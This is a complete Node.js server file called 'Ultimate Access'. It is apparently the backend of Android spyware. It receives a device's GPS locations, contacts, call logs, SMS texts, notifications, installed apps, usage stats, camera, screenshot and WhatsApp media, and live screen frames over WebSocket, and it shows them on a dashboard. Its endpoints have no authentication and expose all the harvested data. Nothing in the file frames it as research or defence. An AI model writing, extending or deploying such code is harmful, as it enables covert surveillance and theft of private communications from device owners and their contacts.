// ============= LOAD ENVIRONMENT VARIABLES =============
require('dotenv').config();

const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const cloudinary = require('cloudinary').v2;

// ============= CONFIGURATION =============
const app = express();
const PORT = process.env.PORT || 5000;
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ============= CLOUDINARY CONFIG =============
if (process.env.CLOUDINARY_URL) {
    cloudinary.config({
        cloudinary_url: process.env.CLOUDINARY_URL
    });
    console.log('☁️ Cloudinary configured');
}

// ============= MIDDLEWARE =============
app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));
app.use(express.static('public'));

// ============= CREATE UPLOADS FOLDER =============
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}
app.use('/uploads', express.static(uploadsDir));

// ============= MULTER CONFIG =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadsDir),
    filename: (req, file, cb) => {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB limit
});

// ============= MONGODB CONNECTION =============
console.log('🚀 Connecting to MongoDB...');

mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected Successfully!'))
    .catch(err => {
        console.error('❌ MongoDB Connection Error:', err);
        process.exit(1);
    });

// ============= MONGOOSE SCHEMAS =============

// Device Info Schema
const DeviceInfoSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, unique: true },
    deviceName: String,
    manufacturer: String,
    model: String,
    androidVersion: String,
    sdkVersion: Number,
    brand: String,
    lastSeen: { type: Date, default: Date.now }
}, { timestamps: true });

// Location Schema
const LocationSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    speed: Number,
    bearing: Number,
    altitude: Number,
    provider: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Contact Schema
const ContactSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    name: String,
    number: String,
    numbers: [String],
    email: String,
    emails: [String],
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Call Log Schema
const CallLogSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    number: String,
    name: String,
    duration: Number,
    type: String,
    date: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// SMS Schema
const SmsSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    address: String,
    body: String,
    date: Date,
    type: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// App Schema
const AppSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    versionName: String,
    versionCode: Number,
    isSystemApp: Boolean,
    firstInstallTime: Date,
    lastUpdateTime: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Usage Schema
const UsageSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    totalTimeInForeground: Number,
    lastTimeUsed: Date,
    firstTimeUsed: Date,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Notification Schema
const NotificationSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    packageName: String,
    appName: String,
    title: String,
    text: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Battery Schema
const BatterySchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    level: Number,
    status: String,
    temperature: Number,
    voltage: Number,
    health: String,
    isCharging: Boolean,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Network Schema
const NetworkSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    networkType: String,
    wifiSSID: String,
    wifiSignalStrength: Number,
    mobileNetworkType: String,
    isWifiConnected: Boolean,
    isMobileConnected: Boolean,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// Media Schema (for Cloudinary)
const MediaSchema = new mongoose.Schema({
    deviceId: { type: String, required: true, index: true },
    url: String,
    publicId: String,
    type: String, // camera, screenshot, whatsapp, download
    fileName: String,
    timestamp: { type: Date, default: Date.now }
}, { timestamps: true });

// ============= CREATE MODELS =============
const DeviceInfo = mongoose.model('DeviceInfo', DeviceInfoSchema);
const Location = mongoose.model('Location', LocationSchema);
const Contact = mongoose.model('Contact', ContactSchema);
const CallLog = mongoose.model('CallLog', CallLogSchema);
const Sms = mongoose.model('Sms', SmsSchema);
const App = mongoose.model('App', AppSchema);
const Usage = mongoose.model('Usage', UsageSchema);
const Notification = mongoose.model('Notification', NotificationSchema);
const Battery = mongoose.model('Battery', BatterySchema);
const Network = mongoose.model('Network', NetworkSchema);
const Media = mongoose.model('Media', MediaSchema);

// ============= WEBSOCKET FOR LIVE SCREEN =============
wss.on('connection', (ws) => {
    console.log('🟢 WebSocket Client Connected');

    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data);

            if (message.type === 'screen_frame') {
                // Broadcast to all connected dashboard clients
                wss.clients.forEach(client => {
                    if (client !== ws && client.readyState === WebSocket.OPEN) {
                        client.send(JSON.stringify({
                            type: 'screen_frame',
                            deviceId: message.deviceId || 'unknown',
                            image: message.image,
                            timestamp: Date.now()
                        }));
                    }
                });
            }
        } catch (e) {
            console.error('WebSocket error:', e.message);
        }
    });

    ws.on('close', () => console.log('🔴 WebSocket Client Disconnected'));
});

// ============= API ENDPOINTS =============

// Health Check
app.get('/health', (req, res) => {
    res.json({
        status: 'ok',
        timestamp: new Date(),
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        websocket: 'running'
    });
});

// Device Registration
app.post('/api/register', async (req, res) => {
    try {
        const deviceData = req.body;
        console.log('📱 Device Registration:', deviceData.deviceId);

        const existing = await DeviceInfo.findOne({ deviceId: deviceData.deviceId });

        if (existing) {
            existing.lastSeen = new Date();
            existing.deviceName = deviceData.deviceName || existing.deviceName;
            await existing.save();
            return res.json({ success: true, message: 'Device updated' });
        }

        const deviceInfo = new DeviceInfo(deviceData);
        await deviceInfo.save();
        console.log('✅ New device registered:', deviceData.deviceId);
        res.json({ success: true, message: 'Device registered' });
    } catch (error) {
        console.error('❌ Device registration error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Location Data
app.post('/api/location', async (req, res) => {
    try {
        const location = new Location(req.body);
        await location.save();
        console.log(`📍 Location saved - Device: ${req.body.deviceId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Location error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Contacts Data
app.post('/api/contacts', async (req, res) => {
    try {
        const { deviceId, contacts } = req.body;

        if (!deviceId || !Array.isArray(contacts)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        await Contact.deleteMany({ deviceId });
        const contactsToSave = contacts.map(contact => ({ deviceId, ...contact }));
        await Contact.insertMany(contactsToSave);

        console.log(`👤 Contacts saved - Device: ${deviceId}, Count: ${contacts.length}`);
        res.json({ success: true, count: contacts.length });
    } catch (error) {
        console.error('❌ Contacts error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Call Logs
app.post('/api/calllogs', async (req, res) => {
    try {
        const { deviceId, callLogs } = req.body;

        if (!deviceId || !Array.isArray(callLogs)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const logsToSave = callLogs.map(log => ({ deviceId, ...log }));
        await CallLog.insertMany(logsToSave);

        console.log(`📞 Call logs saved - Device: ${deviceId}, Count: ${callLogs.length}`);
        res.json({ success: true, count: callLogs.length });
    } catch (error) {
        console.error('❌ Call logs error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// SMS Data
app.post('/api/sms', async (req, res) => {
    try {
        const { deviceId, messages } = req.body;

        if (!deviceId || !Array.isArray(messages)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const smsToSave = messages.map(msg => ({ deviceId, ...msg }));
        await Sms.insertMany(smsToSave);

        console.log(`💬 SMS saved - Device: ${deviceId}, Count: ${messages.length}`);
        res.json({ success: true, count: messages.length });
    } catch (error) {
        console.error('❌ SMS error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Installed Apps
app.post('/api/apps', async (req, res) => {
    try {
        const { deviceId, apps } = req.body;

        if (!deviceId || !Array.isArray(apps)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        await App.deleteMany({ deviceId });
        const appsToSave = apps.map(app => ({ deviceId, ...app }));
        await App.insertMany(appsToSave);

        console.log(`📱 Apps saved - Device: ${deviceId}, Count: ${apps.length}`);
        res.json({ success: true, count: apps.length });
    } catch (error) {
        console.error('❌ Apps error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Usage Stats
app.post('/api/usage', async (req, res) => {
    try {
        const { deviceId, usageStats } = req.body;

        if (!deviceId || !Array.isArray(usageStats)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const usageToSave = usageStats.map(usage => ({ deviceId, ...usage }));
        await Usage.insertMany(usageToSave);

        console.log(`⏱️ Usage stats saved - Device: ${deviceId}, Count: ${usageStats.length}`);
        res.json({ success: true, count: usageStats.length });
    } catch (error) {
        console.error('❌ Usage error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Notifications
app.post('/api/notifications', async (req, res) => {
    try {
        const { deviceId, notifications } = req.body;

        if (!deviceId || !Array.isArray(notifications)) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const notifsToSave = notifications.map(notif => ({ deviceId, ...notif }));
        await Notification.insertMany(notifsToSave);

        console.log(`🔔 Notifications saved - Device: ${deviceId}, Count: ${notifications.length}`);
        res.json({ success: true, count: notifications.length });
    } catch (error) {
        console.error('❌ Notifications error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Battery Status
app.post('/api/battery', async (req, res) => {
    try {
        const battery = new Battery(req.body);
        await battery.save();
        console.log(`🔋 Battery status - Device: ${req.body.deviceId}, Level: ${req.body.level}%`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Battery error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Network Status
app.post('/api/network', async (req, res) => {
    try {
        const network = new Network(req.body);
        await network.save();
        console.log(`🌐 Network status - Device: ${req.body.deviceId}`);
        res.json({ success: true });
    } catch (error) {
        console.error('❌ Network error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Media Upload (to Cloudinary)
app.post('/api/upload', upload.single('file'), async (req, res) => {
    try {
        const { deviceId, type } = req.body;

        if (!deviceId || !req.file) {
            return res.status(400).json({ success: false, error: 'Missing data' });
        }

        let url = '';
        let publicId = '';

        // Upload to Cloudinary if configured
        if (process.env.CLOUDINARY_URL) {
            try {
                const result = await cloudinary.uploader.upload(req.file.path, {
                    folder: `ultimate_access/${deviceId}/${type}`,
                    resource_type: 'auto'
                });
                url = result.secure_url;
                publicId = result.public_id;

                // Delete local file after upload
                fs.unlinkSync(req.file.path);
            } catch (cloudinaryError) {
                console.error('Cloudinary upload failed:', cloudinaryError);
                // Fallback to local storage
                url = `/uploads/${req.file.filename}`;
            }
        } else {
            // Local storage fallback
            url = `/uploads/${req.file.filename}`;
        }

        // Save to database
        const media = new Media({
            deviceId,
            url,
            publicId,
            type,
            fileName: req.file.originalname
        });
        await media.save();

        console.log(`📸 Media uploaded - Device: ${deviceId}, Type: ${type}`);
        res.json({ success: true, url, publicId });
    } catch (error) {
        console.error('❌ Media upload error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Bulk Sync
app.post('/api/sync', async (req, res) => {
    try {
        const { deviceId, data } = req.body;

        if (!deviceId || !data) {
            return res.status(400).json({ success: false, error: 'Invalid data' });
        }

        const results = {};

        if (data.callLogs) {
            await CallLog.insertMany(data.callLogs.map(c => ({ deviceId, ...c })));
            results.callLogs = data.callLogs.length;
        }

        if (data.sms) {
            await Sms.insertMany(data.sms.map(s => ({ deviceId, ...s })));
            results.sms = data.sms.length;
        }

        if (data.contacts) {
            await Contact.insertMany(data.contacts.map(c => ({ deviceId, ...c })));
            results.contacts = data.contacts.length;
        }

        if (data.battery) {
            const battery = new Battery({ deviceId, ...data.battery });
            await battery.save();
            results.battery = 1;
        }

        if (data.network) {
            const network = new Network({ deviceId, ...data.network });
            await network.save();
            results.network = 1;
        }

        console.log(`✅ Bulk sync - Device: ${deviceId}`, results);
        res.json({ success: true, results });
    } catch (error) {
        console.error('❌ Sync error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get Device Data
app.get('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        const device = await DeviceInfo.findOne({ deviceId });
        if (!device) {
            return res.status(404).json({ success: false, error: 'Device not found' });
        }

        const data = {
            device,
            locations: await Location.find({ deviceId }).sort({ timestamp: -1 }).limit(100),
            contacts: await Contact.find({ deviceId }),
            callLogs: await CallLog.find({ deviceId }).sort({ date: -1 }).limit(100),
            sms: await Sms.find({ deviceId }).sort({ date: -1 }).limit(100),
            apps: await App.find({ deviceId }),
            usage: await Usage.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
            notifications: await Notification.find({ deviceId }).sort({ timestamp: -1 }).limit(50),
            battery: await Battery.find({ deviceId }).sort({ timestamp: -1 }).limit(20),
            network: await Network.find({ deviceId }).sort({ timestamp: -1 }).limit(20),
            media: await Media.find({ deviceId }).sort({ timestamp: -1 }).limit(50)
        };

        res.json({ success: true, data });
    } catch (error) {
        console.error('❌ Get device data error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Get All Devices
app.get('/api/devices', async (req, res) => {
    try {
        const devices = await DeviceInfo.find().sort({ lastSeen: -1 });
        res.json({ success: true, devices });
    } catch (error) {
        console.error('❌ Get devices error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Delete Device
app.delete('/api/device/:deviceId', async (req, res) => {
    try {
        const { deviceId } = req.params;

        await DeviceInfo.deleteOne({ deviceId });
        await Location.deleteMany({ deviceId });
        await Contact.deleteMany({ deviceId });
        await CallLog.deleteMany({ deviceId });
        await Sms.deleteMany({ deviceId });
        await App.deleteMany({ deviceId });
        await Usage.deleteMany({ deviceId });
        await Notification.deleteMany({ deviceId });
        await Battery.deleteMany({ deviceId });
        await Network.deleteMany({ deviceId });
        await Media.deleteMany({ deviceId });

        console.log(`🗑️ Device deleted: ${deviceId}`);
        res.json({ success: true, message: 'Device deleted' });
    } catch (error) {
        console.error('❌ Delete error:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============= SERVE DASHBOARD =============
app.get('/dashboard', (req, res) => {
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

app.get('/', (req, res) => {
    res.redirect('/dashboard');
});

// ============= START SERVER =============
server.listen(PORT, '0.0.0.0', () => {
    console.log(`
    ╔══════════════════════════════════════════════╗
    ║     🚀 ULTIMATE ACCESS SERVER RUNNING       ║
    ╠══════════════════════════════════════════════╣
    ║  📍 URL: http://localhost:${PORT}               ║
    ║  📊 Dashboard: http://localhost:${PORT}/dashboard ║
    ║  🔌 WebSocket: ws://localhost:8080           ║
    ║  🗄️  MongoDB: ${mongoose.connection.readyState === 1 ? '✅' : '❌'}                    ║
    ║  ☁️  Cloudinary: ${process.env.CLOUDINARY_URL ? '✅' : '❌'}              ║
    ╚══════════════════════════════════════════════╝
    `);
});